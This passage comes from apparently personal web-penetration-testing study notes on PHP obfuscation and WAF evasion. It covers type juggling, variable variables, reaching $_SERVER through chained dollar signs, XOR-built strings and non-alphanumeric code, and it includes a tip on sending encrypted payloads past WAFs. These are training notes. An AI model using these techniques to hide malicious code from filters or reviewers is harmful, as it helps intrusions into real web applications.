integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6a36dd7b-3ecd-47d8-a2a9-d4647cd57e80" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$x = &#x27;Giuseppe&#x27;;
+echo $x[FALSE];                  // false is (0)                 &gt; &#x27;G&#x27;
+echo $x[TRUE];                   // true is  (1)                 &gt; &#x27;i&#x27;
+echo $x[count(&#x27;hello&#x27;)+true];    // count(object) is 1 (2)       &gt; &#x27;u&#x27;
+echo $x[&quot;7rail&quot;+&quot;3er&quot;-TRUE^0xA]; // PHP ignore trailing data (3) &gt; &#x27;s&#x27;
+</code></pre><ul id="a557fd8b-4a49-4ead-b563-85f2fdb180c9" class="bulleted-list"><li style="list-style-type:disc">Its possible to use the casting functionalities PHP provides:</li></ul><ul id="c83408f1-3e6d-4dc6-82ec-bf0008fe689a" class="bulleted-list"><li style="list-style-type:disc">http://www.php.net/manual/en/language.types.type-juggling.php#language.types.typecasting</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e0cc2c35-3c5a-4a85-9224-f3facd6ca805" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$x = &#x27;Giuseppe&#x27;;
+echo $x[(int)&quot;a common string&quot;]; //(0) &gt; &#x27;G&#x27;
+echo $x[(int)!0];       // True (1)    &gt; &#x27;i&#x27;
+echo $x[(int)&quot;2+1&quot;];    // (2)         &gt; &#x27;u&#x27;
+echo $x[(float)&quot;3.11&quot;]; // (3)         &gt; &#x27;s&#x27;
+echo $x[boolval([&#x27;.&#x27;])+(float)(int)array(0)+floatval(&#x27;2.1+1.2=3.3&#x27;)];
+# true(1)+1+2.1=4.2 is (4)            &gt; &#x27;e&#x27;
+</code></pre><h3 id="98a3dd8d-2bb3-41ec-8ce7-c91724a33800" class=""><strong>String Data Types</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#string-data-types"></a></strong></h3><p id="df70bcba-2969-432d-8e60-f247e2a6a7d8" class="">In PHP there are four different ways in which its possible to specify a string literal:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="264bd4fa-0737-4ff9-8813-1300fe775cf0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- single quoted
+- double quoted
+- heredoc syntax
+- nowdoc syntax (since PHP 5.3.0
+
+# single quotes &#x27; &#x27; = variable and escape sequences For special chars are not expanded
+# double quotes &quot; &quot; - they are expanded
+</code></pre><figure id="b47afff8-9904-4254-99c8-0e38514269ec" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/50.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/50.png"/></a></figure><h3 id="df0bc999-d11a-40ec-a8cc-f5fbfd34d0b2" class=""><strong>Escapes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#escapes"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2550fef6-3345-4932-8f27-8b3008dba2e0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">\n                   # linefeed {LF or 0x04(10) in ASCII)
+\r                   # carriage return (CR or 0x0D (13) in ASCII)
+\t                   # horizontal tab (HT or 0x09(9) in ASCII)
+\v                   # vertical tab (VT or 0x0B(11) in ASCII (since PHP 5.2.5)
+\f                   # form feed (FF or 0x0C(12) in ASCII) (since PHP 5.2.5)
+\\                   # backslash
+\$                   # dollar sign
+\&quot;                   # double-quote
+\[0-7]{1,3}          # sequence of chars matching the regex is a character in octal notation
+\x[0-9A-Fa-f]{1,2}   # sequence matching is a hexadecimal notation
+</code></pre><h3 id="8d0c8578-7ef2-4e2d-846f-b19e82ff0030" class=""><strong>Variable Parsing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#variable-parsing"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="012a81fe-45b0-4a18-9afb-5c90c33c5511" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$s = &quot;\x20&quot;; //space char
+echo &quot;I$sLove Beer&quot;; //theres no $sLove variable &gt; I Beer
+echo &quot;I{$s}Love Beer&quot;;  &gt; I Love Beer
+echo &quot;I${s}Love Beer&quot;;  &gt; I Love Beer
+echo &quot;I{${s}}Love Beer&quot;;&gt; I Love Beer
+</code></pre><ul id="9148df85-b45a-4a34-bb4f-9983094d8fe3" class="bulleted-list"><li style="list-style-type:disc">Even arrays, object methods, class functions with numerical obfuscation are allowed.</li></ul><h3 id="1e7b7b81-a284-4056-951e-31874957c838" class=""><strong>Heredoc and Nowdoc</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#heredoc-and-nowdoc"></a></strong></h3><ul id="e491ba12-b3c8-457a-bc7c-751aa1d066ce" class="bulleted-list"><li style="list-style-type:disc">the preferred ways among command-line programmers</li></ul><ul id="a7fd2183-f9fb-4e22-9f48-e5ca71788b9a" class="bulleted-list"><li style="list-style-type:disc">The identifier must contain only alphanumeric characters and underscores. It must also start with a non-digit char or underscore, thereby making these examples still valid:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68d9392d-5e2d-48fc-bd49-655a3b7a39f6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &lt;&lt;&lt;™[™&amp;¨}]™⅞
+ It works!
+™⅞;
+</code></pre><h3 id="1112a7fd-66cb-40bb-a171-279d7413adb4" class=""><strong>Complex (curly) Syntax {…}</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#complex-curly-syntax-"></a></strong></h3><p id="39a2baf6-6ebc-4581-a725-210b8e23c12d" class="">These are 3 different ways to define a variable named $Beer:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68299963-bfc5-416d-a2b6-c4d9780bc3ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${&#x27;Be&#x27;.&#x27;er&#x27;} = &#x27;Club&#x27;;
+${&#x27;Be&#x27;.str_repeat(&#x27;e&#x27;,2).&#x27;r&#x27;} = &#x27;Club&#x27;;
+${&#x27;Be&#x27;.str_repeat(&#x27;e&#x27;,2).@false./*.*/&#x27;r&#x27;} = &#x27;Club&#x27;;
+</code></pre><p id="4ec46eaa-ab05-4c6a-ab0b-41d3d54a295b" class="">Example of obfuscation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1d010121-3218-473f-8005-75982fb3b8c5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">class beers{
+  const lovely=&#x27;rootbeer&#x27;;
+}
+$rootbeer = &#x27;Club&#x27;
+echo &quot;I&#x27;d like a {${beers::lovely}}!&quot; //Id like a Club!
+</code></pre><h3 id="9af33915-458d-4fa3-b56c-f6386480391e" class=""><strong>Array Data Types</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#array-data-types"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6d054297-81d2-4cc9-a695-ba9d6db42300" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$a = array(x=&gt;123,xx=&gt;456);
+echo $a[&#x27;x&#x27;]; &gt; 123 //normal
+echo $a[x]; &gt; 123  // index without quotes
+echo $a[&quot;\x78&quot;]; &gt; 123 // hexa notation
+echo $a[&#x27;\170&#x27;]; &gt; 123 // octal notation
+echo $a[&#x27;x&#x27;.@false.&quot;\x78&quot;]; &gt; 456 //normal usage with padding and hex.notation
+</code></pre><ul id="0e666b96-b9d4-468d-a52a-140432c8da48" class="bulleted-list"><li style="list-style-type:disc">A simple way to evade WAFs is to not only send your payload encrypted by using GET or POST, but also the key to decrypt via a custom header.</li></ul><h3 id="a9a8d2dd-56fe-41de-a3e2-b978c3eb9464" class=""><strong>Variable Variables</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#variable-variables"></a></strong></h3><p id="7a623914-a0eb-46d2-9372-0dd9936e3d16" class="">Its a way to set a variable name dynamically:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2ccadd54-9199-42d4-9efc-e506d80d3ea1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$var # variable name
+$$var # variable of $var variable
+
+$x = &#x27;love&#x27;;
+$$x = &#x27;beer&#x27;;
+
+echo $x; love
+echo $$x; beer
+echo $love; beer
+echo &quot;$x ${$x}&quot;; love beer
+</code></pre><ul id="41744e8f-9a9f-4a48-b317-538e18d29ab7" class="bulleted-list"><li style="list-style-type:disc">its possible to add more dollar signs</li></ul><ul id="e622cf73-1931-4f02-bd64-91712a6c55db" class="bulleted-list"><li style="list-style-type:disc">with this way, its easy to create code very hard to read.</li></ul><h3 id="f02bc60c-acf5-4954-aa3e-f7609afc84f7" class=""><strong>$_SERVER Superglobal</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#_server-superglobal"></a></strong></h3><p id="e8b46ee7-7add-469c-9bcc-c693634faff2" class="">This is way to access the $_SERVER superglobal</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97d13c1b-31a1-4c73-9fc8-404516022df7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$$$$$$$$$$s = &#x27;_SERVER&#x27;;
+var_dump($$$$$$$$$$s); // null
+var_dump($$$$$$$$$$$s); // string(7) &quot;_SERVER&quot;
+var_dump($$$$$$$$$$$$s); // the $_SERVER array
+</code></pre><p id="80d76d43-713f-4096-bef1-60cf130ff182" class="">PHP Non-Alphanumeric Code</p><ul id="ae394e68-93c6-4700-a3fc-037a92ec3d72" class="bulleted-list"><li style="list-style-type:disc">http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/</li></ul><ul id="cd400da4-d3fd-4421-8c91-a1d84ac15abc" class="bulleted-list"><li style="list-style-type:disc">http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/</li></ul><h3 id="a9bac3ca-631c-4020-9e3f-d878a09a01ca" class=""><strong>Arithmetic Operators</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#arithmetic-operators"></a></strong></h3><ul id="bb2ccb4e-eaea-4c08-94fa-a26d832d6747" class="bulleted-list"><li style="list-style-type:disc">php follows perls convention:</li></ul><ul id="2f85c4f1-f1c0-4059-a4c2-7353f0efaae1" class="bulleted-list"><li style="list-style-type:disc">http://php.net/manual/en/language.operators.increment.php</li></ul><ul id="e1c58e10-7390-483a-8cb4-f525164b9105" class="bulleted-list"><li style="list-style-type:disc">Character variable can only be incremented and not decremented. Only plain ASCII alphabets and digitsw (a-z, A-Z and 0-9) are supported.</li></ul><h3 id="f82b787e-b031-4404-8d28-a21515131d1d" class=""><strong>Bitwise Operators</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#bitwise-operators"></a></strong></h3><p id="a5a84ee9-4cd2-4f18-8b7f-22e6c45bd100" class="">Its possible to use bitwise operators on strings. example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d4020a29-08f2-4ea7-a0e1-ed4474909f9d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo A&amp;B; //@
+echo A|B; //C
+echo A^B; //U+0003 END OF TEXT
+echo ~A; //U+00BE Vulgar fraction three quarters
+echo A&lt;&lt;B; //0
+</code></pre><h3 id="3acf7009-ce12-47b9-9f80-b47030fc1853" class=""><strong>Native PHP Objects</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#native-php-objects"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5dfb06f4-eaef-4016-a4fb-ee8a7e230b52" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$a = []; #create an empty array object
+$a = $a.!![]; # convert the array to string &quot;Array&quot;
+$_ = $__ = ![]&amp;!![]; #true &amp; false generates the int(0) &quot;0&quot;
+$__++; #increment int (0) by one &quot;1&quot;
+$_§ = $__§ = $a[$_]; # Access the position 0 of the &#x27;array&#x27; string &quot;A&quot;
+$__§++; #Get the next char after A &quot;B&quot;
+echo $_§|$__§; #echos A|B &quot;C&quot;
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="852e753c-0423-4265-8c8e-dfd47745ff1a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$_=&quot;{&quot; #XOR char
+echo ($_^&quot;&lt;&quot;).($_^&quot;&gt;;&quot;).($_^&quot;/&quot;); #XOR magic &gt; &#x27;GET&#x27;
+</code></pre><blockquote id="b01fa1af-fbc4-4b32-8d99-839784396a2c" class="">hackvertor.co.uk - It has 2 options to encode PHP into non-alphanumeric code.</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
